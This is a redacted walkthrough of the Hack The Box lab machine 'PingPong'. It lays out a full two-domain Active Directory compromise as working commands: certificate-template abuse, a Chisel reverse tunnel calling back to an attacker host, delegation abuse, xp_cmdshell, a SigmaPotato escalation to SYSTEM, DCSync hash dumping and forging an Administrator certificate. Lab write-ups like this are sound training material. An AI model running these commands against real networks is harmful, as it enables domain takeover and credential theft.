# PingPong — Hack The Box Writeup

> **Status:** Rooted  
> **Platform:** Hack The Box  
> **Category:** Active Directory / ADCS / Kerberos / Trust Abuse  
> **Date:** 27 Apr 2026  
> **Author:** C4sh3R

## Disclaimer

This writeup is intentionally **redacted**. Passwords, hashes, AES keys, object SIDs, internal IPs, public IPs, certificate files, request IDs and private paths have been replaced with placeholders.

Examples:

```text
<DC1_IP>
<DC2_INTERNAL_IP>
<ATTACKER_IP>
<C_ROBERTS_CERT>.pfx
<C_CARLSSEN_PASSWORD>
<PONG_GMSA_AES256>
<R_MARTINELLI_NT_HASH>
<R_MARTINELLI_AES256>
<ADMINISTRATOR_SID>
```

---

## 1. Overview

PingPong is a multi-domain Active Directory machine built around two domains:

```text
PING.HTB
PONG.HTB
```

The final attack chain was:

```text
Initial creds for C.Roberts@PING
↓
ADCS ESC13 through TemporaryWinRM
↓
Certificate authentication as C.Roberts
↓
WinRM access to DC1
↓
Chisel pivot into the internal PONG network
↓
gMSA abuse to recover Pong_gMSA$
↓
JEA / PowerShell artefact recovery
↓
Credentials for c.carlssen
↓
RBCD over svc_sql using Pong_gMSA$
↓
S4U to impersonate c.adam against MSSQL
↓
MSSQL xp_cmdshell as svc_sql
↓
SigmaPotato to SYSTEM on DC2
↓
Add c.carlssen to local Administrators
↓
DCSync R.Martinelli
↓
R.Martinelli abuses CA Managers rights in PING
↓
ESC4 over SmartcardAuthentication
↓
Convert template to ESC1
↓
Grant Enroll permission
↓
Request Administrator@ping.htb certificate
↓
PKINIT as Administrator
↓
Root
```

---

## 2. Kerberos and host resolution

NTLM was effectively unusable in several places, so Kerberos was required across almost the entire chain.

Useful variables:

```bash
export KRB5_CONFIG=./krb5.conf
export KRB5CCNAME=./<ticket>.ccache
```

Two host mappings were needed depending on the phase.

### External access to PING

```text
<DC1_IP> dc1.ping.htb dc1 ping.htb
```

### Internal access through the pivot

```text
<DC1_INTERNAL_IP> dc1.ping.htb dc1 ping.htb
<DC2_INTERNAL_IP> dc2.pong.htb dc2 pong.htb
```

Rule of thumb:

```text
WinRM / certipy auth directly from Kali → use external DC1 IP
LDAP / RPC through Chisel              → use internal DC1 IP and proxychains
PONG/DC2 access                        → use internal DC2 IP and proxychains
```

---

## 3. Foothold — ADCS ESC13 in PING

Certipy identified a vulnerable template:

```text
Template: TemporaryWinRM
Vulnerability: ESC13
CA: ping-DC1-CA
```

The template mapped certificate authentication into a group that allowed WinRM access.

Request certificate:

```bash
certipy req \
  -u 'C.Roberts@ping.htb' \
  -p '<C_ROBERTS_PASSWORD>' \
  -ca 'ping-DC1-CA' \
  -template 'TemporaryWinRM' \
  -target dc1.ping.htb \
  -target-ip <DC1_IP> \
  -dc-ip <DC1_IP> \
  -dc-host dc1.ping.htb
```

Authenticate with the certificate:

```bash
certipy auth \
  -pfx <C_ROBERTS_CERT>.pfx \
  -domain ping.htb \
  -dc-ip <DC1_IP>
```

Load the ticket:

```bash
export KRB5CCNAME=./c.roberts.ccache
```

Connect with WinRM:

```bash
evil-winrm -i dc1.ping.htb -r PING.HTB --spn WSMAN
```

If needed:

```bash
evil-winrm -i dc1.ping.htb -r PING.HTB --spn HTTP
```

---

## 4. Pivot into PONG

A reverse SOCKS tunnel was created using Chisel.

On Kali:

```bash
./chisel server -p <PORT> --reverse
```

On DC1:

```powershell
cd C:\Windows\Temp
upload ./chisel.exe C:\Windows\Temp\chisel.exe
C:\Windows\Temp\chisel.exe client <ATTACKER_IP>:<PORT> R:socks
```

Connectivity checks:

```bash
proxychains4 -q nc -nv dc2.pong.htb 5985
proxychains4 -q nc -nv dc2.pong.htb 1433
proxychains4 -q nc -nv dc1.ping.htb 389
```

---

## 5. gMSA abuse

BloodHound showed a path from the initial PING user to `gMSA Managers` in PONG.

The group scope had to be changed so a foreign principal could be added:

```bash
proxychains4 -q bloodyAD \
  -k \
  -d pong.htb \
  -u c.roberts \
  --host dc2.pong.htb \
  set object 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' groupType -v -2147483644
```

Then the foreign SID was added:

```bash
proxychains4 -q bloodyAD \
  -k \
  -d pong.htb \
  -u c.roberts \
  --host dc2.pong.htb \
  add groupMember 'CN=gMSA Managers,CN=Users,DC=pong,DC=htb' '<C_ROBERTS_SID>'
```

The managed password for `Pong_gMSA$` was recovered and converted into usable Kerberos material.

TGT for the gMSA:

```bash
proxychains4 -q impacket-getTGT \
  PONG.HTB/'Pong_gMSA$' \
  -aesKey <PONG_GMSA_AES256> \
  -dc-ip <DC2_INTERNAL_IP>
```

---

## 6. JEA and credential recovery

The `Pong_gMSA$` context had access to a restricted JEA endpoint. The session was constrained:

```text
LanguageMode: ConstrainedLanguage
```

Allowed commands were minimal:

```text
Get-Command
Get-FormatData
Get-Help
Measure-Object
Out-Default
Select-Object
Exit-PSSession
Clear-Host
```

The important environment values were:

```text
$HOME = C:\Users\Pong_gMSA$
$PWD  = C:\Users\Pong_gMSA$\Documents
```

Through PowerShell artefact recovery, credentials for `c.carlssen` were discovered.

Redacted result:

```text
PONG\c.carlssen : <C_CARLSSEN_PASSWORD>
```

TGT:

```bash
proxychains4 -q impacket-getTGT \
  PONG.HTB/'c.carlssen':'<C_CARLSSEN_PASSWORD>' \
  -dc-ip <DC2_INTERNAL_IP>

export KRB5CCNAME=./c.carlssen.ccache
```

WinRM:

```bash
proxychains4 -q evil-winrm -i dc2.pong.htb -r PONG.HTB --spn HTTP
```

---

## 7. RBCD over svc_sql

`c.carlssen` had `GenericWrite` over `svc_sql`. Since `MachineAccountQuota` was 0, `Pong_gMSA$` was reused as the delegation principal.

```bash
proxychains4 -q bloodyAD \
  -k \
  -d pong.htb \
  -u c.carlssen \
  --host dc2.pong.htb \
  add rbcd svc_sql 'Pong_gMSA$'
```

S4U to impersonate `c.adam` against MSSQL:

```bash
export KRB5CCNAME=./pong_gmsa.ccache

proxychains4 -q impacket-getST \
  -spn MSSQLSvc/dc2.pong.htb \
  -impersonate c.adam \
  -k -no-pass \
  -dc-ip <DC2_INTERNAL_IP> \
  PONG.HTB/'Pong_gMSA$'
```

Load ticket:

```bash
export KRB5CCNAME=./c.adam@MSSQLSvc_dc2.pong.htb@PONG.HTB.ccache
```

Connect to MSSQL:

```bash
proxychains4 -q impacket-mssqlclient \
  -k -no-pass \
  -dc-ip <DC2_INTERNAL_IP> \
  -target-ip <DC2_INTERNAL_IP> \
  PONG.HTB/c.adam@dc2.pong.htb
```

Basic checks:

```sql
select system_user;
xp_cmdshell "whoami";
```

Execution context:

```text
pong\svc_sql
```

---

## 8. Local privilege escalation on DC2

Several impersonation tools were tested. The one that worked reliably was:

```text
SigmaPotato.exe
```

Upload:

```powershell
cd C:\temp
upload ./SigmaPotato.exe C:\temp\SigmaPotato.exe
```

Test from MSSQL:

```sql
xp_cmdshell "C:\temp\SigmaPotato.exe whoami"
```

Expected output:

```text
nt authority\system
```

To execute commands with spaces, a BAT file was used:

```sql
xp_cmdshell "echo net localgroup Administrators PONG\c.carlssen /add 1>C:\temp\add.txt 2>&1 > C:\temp\add.bat"
xp_cmdshell "cd C:\temp && .\SigmaPotato.exe add.bat"
```

Verify:

```sql
xp_cmdshell "net localgroup Administrators"
```

Result:

```text
C.Carlssen added to local Administrators
```

---

## 9. DCSync R.Martinelli

With local admin on DC2, DCSync was used to dump `R.Martinelli`.

```bash
export KRB5CCNAME=./c.carlssen.ccache

proxychains4 -q impacket-secretsdump \
  -k -no-pass \
  -dc-ip <DC2_INTERNAL_IP> \
  -just-dc-user 'R.Martinelli' \
  PONG.HTB/c.carlssen@dc2.pong.htb
```

Redacted result:

```text
R.Martinelli:<RID>:<LM_HASH>:<R_MARTINELLI_NT_HASH>:::
R.Martinelli:aes256-cts-hmac-sha1-96:<R_MARTINELLI_AES256>
```

TGT:

```bash
proxychains4 -q impacket-getTGT \
  PONG.HTB/'R.Martinelli' \
  -aesKey <R_MARTINELLI_AES256> \
  -dc-ip <DC2_INTERNAL_IP>
```

---

## 10. ESC4 to ESC1 in PING

`R.Martinelli` was a member of `CA MANAGERS@PING.HTB`, which had rights over the `SmartcardAuthentication` template.

`certipy template` did not work reliably because it tried to use a `HOST/dc1.ping.htb` ticket for LDAP bind. The working path was direct LDAP with GSSAPI.

Validate LDAP:

```bash
KRB5_CONFIG=./krb5.conf KRB5CCNAME=./R.Martinelli.work.ccache \
proxychains4 -q ldapsearch -LLL -o ldif-wrap=no -Y GSSAPI -N \
  -H ldap://dc1.ping.htb:389 \
  -b "" \
  -s base \
  defaultNamingContext configurationNamingContext
```

Read template:

```bash
KRB5_CONFIG=./krb5.conf KRB5CCNAME=./R.Martinelli.work.ccache \
proxychains4 -q ldapsearch -LLL -o ldif-wrap=no -Y GSSAPI -N \
  -H ldap://dc1.ping.htb:389 \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb" \
  "(|(cn=SmartcardAuthentication)(displayName=Smartcard Authentication))" \
  cn displayName distinguishedName msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag msPKI-RA-Signature pKIExtendedKeyUsage
```

The original value was redacted, but the key change was enabling:

```text
ENROLLEE_SUPPLIES_SUBJECT = 0x1
```

LDIF:

```bash
cat > esc4_to_esc1.ldif << 'EOF'
dn: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
changetype: modify
replace: msPKI-Certificate-Name-Flag
msPKI-Certificate-Name-Flag: <ORIGINAL_FLAG_WITH_BIT_0x1_ENABLED>
-
replace: msPKI-RA-Signature
msPKI-RA-Signature: 0
EOF
```

Apply:

```bash
KRB5_CONFIG=./krb5.conf KRB5CCNAME=./R.Martinelli.work.ccache \
proxychains4 -q ldapmodify -Y GSSAPI -N \
  -H ldap://dc1.ping.htb:389 \
  -f esc4_to_esc1.ldif
```

---

## 11. Grant Enroll permission

The certificate request initially failed with:

```text
CERTSRV_E_TEMPLATE_DENIED
The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
```

So an `Enroll` ACE had to be added to the certificate template for `R.Martinelli`.

Redacted SID:

```text
R.Martinelli SID: <R_MARTINELLI_SID>
```

Because LDAP required stronger authentication, LDAPS on port 636 was used.

Once Enroll was granted, the certificate request succeeded.

---

## 12. Request Administrator certificate

```bash
KRB5_CONFIG=./krb5.conf KRB5CCNAME=./R.Martinelli.work.ccache \
proxychains4 -q ./imp-master/bin/certipy req \
  -k -no-pass \
  -target dc1.ping.htb \
  -target-ip <DC1_INTERNAL_IP> \
  -dc-ip <DC2_INTERNAL_IP> \
  -dc-host dc2.pong.htb \
  -ca 'ping-DC1-CA' \
  -template SmartcardAuthentication \
  -upn Administrator@ping.htb \
  -debug
```

The first certificate had no object SID, so the real Administrator SID from PING was retrieved:

```bash
KRB5_CONFIG=./krb5.conf KRB5CCNAME=./R.Martinelli.work.ccache \
proxychains4 -q ldapsearch -LLL -o ldif-wrap=no -Y GSSAPI -N \
  -H ldap://dc1.ping.htb:389 \
  -b "DC=ping,DC=htb" \
  "(sAMAccountName=Administrator)" \
  objectSid distinguishedName sAMAccountName
```

Redacted:

```text
Administrator SID: <ADMINISTRATOR_SID>
```

Request again with SID:

```bash
KRB5_CONFIG=./krb5.conf KRB5CCNAME=./R.Martinelli.work.ccache \
proxychains4 -q ./imp-master/bin/certipy req \
  -k -no-pass \
  -target dc1.ping.htb \
  -target-ip <DC1_INTERNAL_IP> \
  -dc-ip <DC2_INTERNAL_IP> \
  -dc-host dc2.pong.htb \
  -ca 'ping-DC1-CA' \
  -template SmartcardAuthentication \
  -upn Administrator@ping.htb \
  -sid '<ADMINISTRATOR_SID>'
```

Output:

```text
Successfully requested certificate
Got certificate with UPN 'Administrator@ping.htb'
Certificate object SID is '<ADMINISTRATOR_SID>'
Saved certificate and private key to 'administrator.pfx'
```

---

## 13. Final authentication

Switch DC1 back to the external address:

```bash
sudo sed -i '/dc1\.ping\.htb/d;/ping\.htb/d' /etc/hosts
echo '<DC1_IP> dc1.ping.htb dc1 ping.htb' | sudo tee -a /etc/hosts
```

Authenticate:

```bash
certipy auth \
  -pfx administrator.pfx \
  -domain ping.htb \
  -dc-ip <DC1_IP>
```

Load ticket:

```bash
export KRB5CCNAME=./administrator.ccache
klist
```

WinRM:

```bash
evil-winrm -i dc1.ping.htb -r PING.HTB --spn WSMAN
```

Fallback:

```bash
evil-winrm -i dc1.ping.htb -r PING.HTB --spn HTTP
```

Read root:

```powershell
whoami
hostname
type C:\Users\Administrator\Desktop\root.txt
```

---

## Main issues and fixes

### NTLM disabled

Use Kerberos everywhere.

### Evil-WinRM SPN problems

Try both:

```bash
--spn WSMAN
--spn HTTP
```

### Certipy LDAP issue

`certipy template` attempted to use `HOST/dc1.ping.htb` for LDAP and failed.

Fix: use `ldapmodify` with GSSAPI.

### Template was ESC1 but request was denied

Fix: grant Enroll over the template to the requesting principal.

### Certificate without SID

Fix: request the certificate again with `-sid <ADMINISTRATOR_SID>`.

---

## Conclusion

PingPong combines:

```text
ADCS ESC13
Kerberos-only authentication
Cross-domain trust abuse
gMSA password extraction
JEA restrictions
RBCD
MSSQL S4U
SigmaPotato
DCSync
ADCS ESC4 → ESC1
Certificate mapping with SID
```

The hardest part was not a single exploit, but keeping the state clean: tickets, SPNs, ccaches, DNS/hosts switching, proxychains, LDAP, RPC and cross-realm Kerberos.

**Rooted.**
